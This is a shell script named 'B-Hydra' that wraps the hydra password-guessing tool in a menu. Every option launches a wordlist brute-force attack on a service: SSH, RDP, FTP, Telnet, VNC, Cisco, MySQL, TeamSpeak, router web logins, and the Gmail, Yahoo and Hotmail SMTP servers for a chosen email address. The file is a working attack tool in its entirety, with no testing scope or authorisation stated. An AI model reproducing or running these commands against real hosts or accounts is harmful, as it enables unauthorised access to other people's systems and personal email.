#!/bin/sh

clear

ciscoBrute() {
	read -p "[*] IP/Hostname: " targetAddress
	read -p "[*] Wordlist: " wordlist
	
	hydra -P $wordlist $targetAddress cisco
}

vncBrute() {
	read -p "[*] IP/Hostname: " targetAddress
	read -p "[*] Wordlist: " wordlist

	hydra -P $wordlist -e n -t 1 $targetAddress vnc -V
}

ftpBrute() {
	read -p "[*] IP/Hostname: " targetAddress
	read -p "[*] User: " user
	read -p "[*] Wordlist: " wordlist

	hydra -l $user -P $wordlist $targetAddress ftp
}

gmailBrute() {
	echo "This option is deprecated"

	read -p "[*] Email: " email
	read -p "[*] Wordlist: " wordlist

	hydra -l $email -P $wordlist -s 465 smtp.gmail.com smtp
}

sshBrute() {
	read -p "[*] IP/Hostname: " targetAddress
	read -p "[*] User: " user
	read -p "[*] Wordlist: " wordlist

	hydra -t 4 -l $user -P $wordlist $targetAddress ssh
}

tsBrute() {
	read -p "[*] IP/Hostname: " targetAddress
	read -p "[*] User: " user
	read -p "[*] Wordlist: " wordlist

	hydra -l $user -P $wordlist -s 8676 $targetAddress teamspeak
}

telnetBrute() {
	read -p "[*] IP/Hostname: " targetAddress
	read -p "[*] User: " user
	read -p "[*] Wordlist: " wordlist

	hydra -l $user -P $wordlist $targetAddress telnet
}

yahooBrute() {
	read -p "[*] Email: " email
	read -p "[*] Wordlist: " wordlist

	hydra -l $email -P $wordlist -s 587 smtp.mail.yahoo.com smtp tls
}

hotmailBrute() {
	read -p "[*] Email: " email
	read -p "[*] Wordlist: " wordlist

	hydra -l $email -P $wordlist -s 587 smtp.live.com smtp
}

routerSpeedyBrute() {
	read -p "[*] IP/Hostname: " targetAddress
	read -p "[*] User: " user
	read -p "[*] Wordlist: " wordlist

	hydra -m / -l $user -P $wordlist $targetAddress http-get
}

rdpBrute() {
	read -p "[*] IP/Hostname: " targetAddress
	read -p "[*] User: " user
	read -p "[*] Wordlist: " wordlist

	hydra -t 1 -V -f -l $user -P $wordlist $targetAddress rdp
}

mysqlBrute() {
	read -p "[*] User: " user
	read -p "[*] Wordlist: " wordlist

	hydra -t 5 -V -f -l $user -e ns -P $wordlist localhost mysql
}

echo "
	___  _    ____ ____ _  _    _  _ _   _ ___  ____ ____
	|__] |    |__| |    |_/     |__|  \_/  |  \ |__/ |__|
	|__] |___ |  | |___ | \_    |  |   |   |__/ |  \ |  |
	-----------------------------------------------------

  [01] Cisco Brute Force         
  [02] VNC Brute Force           
  [03] FTP Brute Force           
  [04] Gmail Brute Force         
  [05] SSH Brute Force           
  [06] TeamSpeak Brute Force     
  [07] Telnet Brute Force        
  [08] Yahoo Mail Brute Force    
  [09] Hotmail Brute Force       
  [10] Router Speedy Brute Force 
  [11] RDP Brute Force           
  [12] MySQL Brute Force

  [00] Exit

	"
	read -p "[*] B-Hydra > " optionSelected

	case $optionSelected in 
		1 | 01)
			ciscoBrute
			;;
		2 | 02)
			vncBrute
			;;
		3 | 03)
			ftpBrute
			;;
		4 | 04)
			gmailBrute
			;;
		5 | 05)
			sshBrute
			;;
		6 | 06)
			tsBrute
			;;
		7 | 07)
			telnetBrute
			;;
		8 | 08)
			yahooBrute
			;;
		9 | 09)
			hotmailBrute
			;;
		10)
			routerSpeedyBrute
			;;
		11)
			rdpBrute
			;;
		12)
			mysqlBrute
			;;
		*)
			echo "Invalid option"
			;;
	esac
